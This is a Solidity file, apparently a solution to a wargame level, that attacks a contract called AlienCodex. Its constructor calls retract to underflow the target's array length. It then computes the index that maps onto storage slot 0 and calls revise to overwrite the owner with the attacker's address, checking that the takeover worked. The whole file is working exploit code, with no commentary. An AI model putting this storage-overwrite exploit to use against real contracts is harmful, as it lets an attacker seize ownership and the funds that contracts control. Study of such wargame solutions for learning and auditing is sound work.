// SPDX-License-Identifier: MIT

pragma solidity 0.8.19;

interface AlienCodex {
  function owner() external view returns (address);
  function make_contact() external;
  function record(bytes32 _content) external;
  function retract() external;
  function revise(uint i, bytes32 _content) external;
}

contract AlienCodexHack {
  constructor(AlienCodex codex) {
    codex.make_contact();
    codex.retract();

    uint firstIndex = uint256(keccak256(abi.encode(uint(1))));
    uint zeroIndex;

    unchecked {
      zeroIndex -= firstIndex;
    }

  //codex.revise(zeroIndex, bytes32(bytes20(msg.sender)));
    codex.revise(zeroIndex, bytes32(uint256(uint160(msg.sender))));

    require(codex.owner() == msg.sender, 'hack failed');
  }
}